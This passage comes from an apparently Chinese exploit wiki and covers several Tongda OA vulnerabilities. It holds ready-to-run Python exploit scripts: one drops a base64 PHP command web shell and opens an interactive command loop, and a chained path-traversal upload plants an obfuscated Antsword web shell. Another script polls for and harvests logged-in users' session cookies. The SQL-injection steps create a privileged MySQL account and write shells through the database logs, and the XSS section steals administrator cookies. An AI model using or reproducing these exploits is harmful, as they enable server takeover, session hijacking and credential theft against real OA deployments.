\\033[0m\".format(e)) sys.exit(0) def POC_4(target_url, cmd): cmd_url = target_url + \"/_peiqi.php?peiqi={}\".format(cmd) try: cmd_response = requests.get(url = cmd_url) if cmd_response.status_code == 200: print(\"\\033[32m[o] 正在执行命令: {} \\033[0m\".format(cmd_url)) print(\"\\033[32m[o] 响应为: \\n{} \\033[0m\".format(cmd_response.text)) else: print(\"\\033[31m[x] 命令执行失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败，{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) POC_2(target_url) payload_php = base64.b64decode(\"PD9waHAKICAgICRjb21tYW5kPSRfR0VUWydwZWlxaSddOwogICAgJHdzaCA9IG5ldyBDT00oJ1dTY3JpcHQuc2hlbGwnKTsKICAgICRleGVjID0gJHdzaC0+ZXhlYygiY21kIC9jICIuJGNvbW1hbmQpOwogICAgJHN0ZG91dCA9ICRleGVjLT5TdGRPdXQoKTsKICAgICRzdHJvdXRwdXQgPSAkc3Rkb3V0LT5SZWFkQWxsKCk7CiAgICBlY2hvICRzdHJvdXRwdXQ7Cj8+\").decode(\"utf-8\") POC_3(target_url, payload_php) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_4(target_url, cmd) POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.7 后台SQL注入.html":{"url":"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.7 后台SQL注入.html","title":"通达OA v11.7 后台SQL注入","keywords":"","body":"通达OA v11.7后台SQL注入 漏洞描述 通达OA v11.7后台存在SQL注入，可通过此漏洞写入恶意后门文件攻击目标服务器 漏洞影响 [!NOTE] 通达OA v11.7 环境搭建 环境地址 漏洞复现 在 general/hr/manage/query/delete_cascade.php 文件中 首先判断$condition_cascade是否为空，如果不为空，则将其中的\\'替换为'。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用addslashes函数进行保护，如下： inc/common.inc.php 代码 使用盲注对SQL注入进行测试 触发了通达OA的SQL注入拦截 inc/conn.php文件中找到过滤机制如下: 其过滤了一些字符，但是并非无法绕过，盲注的核心是：substr、if等函数，均未被过滤，那么只要构造MySQL报错即可配合if函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现power(9999,99)也可以使数据库报错，所以构造语句： select if((substr(user(),1,1)='r'),1,power(9999,99)) # 当字符相等时，不报错，错误时报错 添加SQL数据库用户 grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 访问 http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 进入 Myoa/mysql5/bin 目录 执行 mysql -upeiqi -p 输入密码查询所有用户 发现成功执行添加一个账户 然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限： UPDATE `mysql`.`user` SET `Password` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('peiqi' AS Binary(5)); 然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;这样就拥有了所有权限 登录如果失败，执行 grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION 利用漏洞写shell # 查路径： select @@basedir; # F:\\OA\\mysql5\\，那么web目录就是 F:/OA/webroot/ # 方法1： set global slow_query_log=on; set global slow_query_log_file='F:/OA/webroot/'; select '' or sleep(11); # 方法2： set global general_log = on; set global general_log_file = 'F:/OA/webroot/'; select ''; show variables like '%general%'; 上传大马 参考文章 通达OA v11.7后台SQL注入到RCE[0day] POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.7 在线用户登录漏洞.html":{"url":"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.7 在线用户登录漏洞.html","title":"通达OA v11.7 在线用户登录漏洞","keywords":"","body":"通达OA v11.7 在线用户登录漏洞 漏洞描述 通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统 漏洞影响 [!NOTE] 通达OA 环境搭建 通达OA v11.7下载链接 下载后按步骤安装即可 漏洞复现 漏洞有关文件 MYOA\\webroot\\mobile\\auth_mobi.php 在执行的 SQL语句中 $sql = 'SELECT SID FROM user_online WHERE UID = \\'' . $uid . '\\' and CLIENT = \\'' . $P_VER . '\\''; 简单阅读PHP源码可以知道 此SQL语句会查询用户是否在线，如在线返回此用户 Session ID 将返回的 Set-Cookie 中的Cookie参数值使用于登录Cookie 访问目标后台 http://xxx.xxx.xxx.xxx/general/ 当目标离线时则访问漏洞页面则会出现如下图 [!NOTE] 通过此思路可以持续发包监控此页面来获取在线用户的Cookie 漏洞利用POC [!NOTE] 5秒一次测试用户是否在线 import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 通达OA 11.7 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"RELOGIN\" in response.text and response.status_code == 200: print(\"\\033[31m[x] 目标用户为下线状态 --- {}\\033[0m\".format(time.asctime( time.localtime(time.time())))) elif response.status_code == 200 and response.text == \"\": PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers)) print(\"\\033[32m[o] 用户上线 PHPSESSION: {} --- {}\\033[0m\".format(PHPSESSION[0] ,time.asctime(time.localtime(time.time())))) else: print(\"\\033[31m[x] 请求失败，目标可能不存在漏洞\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) while True: POC_1(target_url) time.sleep(5) [!NOTE] 于 2021-3-11 添加进一步利用POC 配合 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 通达OA 11.7 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_0(target_url): vuln_url = target_url + \"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"RELOGIN\" in response.text and response.status_code == 200: print(\"\\033[31m[x] 目标用户为下线状态 --- {}\\033[0m\".format(time.asctime( time.localtime(time.time())))) elif response.status_code == 200 and response.text == \"\": Cookie = re.findall(r'PHPSESSID=(.*?);', str(response.headers)) print(\"\\033[32m[o] 用户上线 PHPSESSION: {} --- {}\\033[0m\".format(Cookie[0] ,time.asctime(time.localtime(time.time())))) Cookie = \"PHPSESSID={};USER_NAME_COOKIE=admin; OA_USER_ID=admin\".format(Cookie[0]) POC_1(target_url, Cookie) else: print(\"\\033[31m[x] 请求失败，目标可能不存在漏洞\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"PeiQi_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] 成功上传蚁剑木马 密码为: PeiQi \\n[o] webshell路径: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) sys.exit(0) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) while True: POC_0(target_url) time.sleep(5) POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.8 后台文件包含XSS漏洞.html":{"url":"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.8 后台文件包含XSS漏洞.html","title":"通达OA v11.8 后台文件包含XSS漏洞","keywords":"","body":"通达OA v11.8 后台文件包含存储型XSS漏洞 漏洞描述 通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有xss语句的文件，使管理员后台文件均包含XSS语句，被攻击者获取敏感信息 漏洞影响 [!NOTE] 通达OA 环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 漏洞复现 这里使用的环境为通达 v11.6版本，v11.6版本中的漏洞利用较好，在 v11.7 后续版本中规定了上传路径，导致XSS利用会比较困难 出现漏洞的文件为 webroot/general/hr/manage/staff_info/update.php \\r\\n\"; echo \"\\r\\n\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"附件上传失败\"), _(\"原因：附件文件为空或文件名太长，或附件大于30兆字节，或文件路径不存在！\")); Button_Back(); exit(); } } 在这里参数 $USER_ID 是可控的，并且无过滤危险符号就拼接进去了，那我们传入 ../../../ 我们就可以任意文件上传了 由于通达OA 的文件上传限制的死死的，所以我们可以通过利用 PHP的 .user.ini 文件来包含其他文件，这里是可以用于包含XSS语句的文件的，所以我们上传文件 内容为 auto_prepend_file=peiqi.log 我们想要最大化利用可以上传在首页或者管理员 界面，利用自定义弹窗来渗透 这里对管理员页面 general 目录上传 请求包为 POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1 Host: 192.168.1.105 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104 Content-Length: 365 Connection: close Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31 Upgrade-Insecure-Requests: 1 -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log -----------------------------17518323986548992951984057104 Content-Disposition: form-data; name=\"submit\" 提交 -----------------------------17518323986548992951984057104-- 其中 USER_ID=../../general/.user 为上传路径 Content-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"peiqi.ini\" Content-Type: text/plain auto_prepend_file=peiqi.log 这里拼接后上传就变成了 .user.ini 这里再上传 XSS文件 peiqi.log 被包含进去 上传后每次管理员登录后都会带着Cookie请求一次XSS平台 钓鱼什么的代码写在peiqi.log文件里就好啦 刚刚提到了 v11.7版本不方便利用，这是因为在后续版本加上了文件上传的规定路径 if ((strpos($source, \"webroot\") !== false) && (strpos($source, \"attachment\") === false)) { return false; } else { return true; } 路径中必须要包含 webroot 和 attachment 才可以上传 这里XSS的利用点有4个文件夹，其中最有几率XSS的为存储目录管理的文件夹 用同样的方法上传利用文件，每次当管理员设置时就会盗取Cookie 漏洞利用POC 因为是xss可能对目标有影响，所以这里POC在一个不常用目录探测是否存在漏洞 Cookie填写访问后台时的Cookie, 其中的base64解码更改 PeiQi_Wiki为 自己的XSS语句 v11.6及以下 攻击 /general 和 /general/system/attachment 目录较好 v11.6以上 攻击 /general/system/attachment 目录较好 import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 通达OA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传.user.ini文件, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传.user.ini文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033[0m\".format(target_url)) if \"档案已保存\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 成功上传 peiqi.log 文件, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] 目标 {} 上传 peiqi.log 文件失败\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \\033[0m\".format(target_url)) if \"PeiQi_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞，响应中包含 PeiQi_Wiki,存在XSS漏洞, 可参考文章写的利用版本进一步攻击 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞，响应中不包含 PeiQi_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31\" POC_1(target_url, Cookie) 参考文章 https://paper.seebug.org/1499/ POChouse all right reserved，powered by GitbookFile Modify: 2021-06-28 20:31:33 "},"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.8 后台文件包含命令执行漏洞.html":{"url":"[+] 协同办公OA系统/Tongda-通达OA/通达OA v11.8 后台文件包含命令执行漏洞.html","title":"通达OA v11.8 后台文件包含命令执行漏洞","keywords":"","body":"通达OA v11.8 后台文件包含命令执行漏洞 漏洞描述 通达OA v11.8以下存在文件上传接口，可上传 .user.ini 文件包含有PHP语句的文件导致命令执行 漏洞影响 [!NOTE] 通达OA 环境搭建 通达OA v11.6下载链接 下载完毕点击安装即可 漏洞复现 这里使用的环境为通达 v11.6版本 出现漏洞的文件为 webroot/general/hr/manage/staff_info/update.php \\r\\n\"; echo \"\\r\\n\\r\\n\"; $PHOTO_NAME0 = $_FILES[\"ATTACHMENT\"][\"name\"]; $ATTACHMENT = $_FILES[\"ATTACHMENT\"][\"tmp_name\"]; if ($PHOTO_NAME0 != \"\") { $FULL_PATH = MYOA_ATTACH_PATH . \"hrms_pic\"; if (!file_exists($FULL_PATH)) { @mkdir($FULL_PATH, 448); } $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, \".\")); $FILENAME = MYOA_ATTACH_PATH . \"hrms_pic/\" . $PHOTO_NAME; td_copy($ATTACHMENT, $FILENAME); if (file_exists($ATTACHMENT)) { unlink($ATTACHMENT); } if (!file_exists($FILENAME)) { Message(_(\"附件上传失败\"), 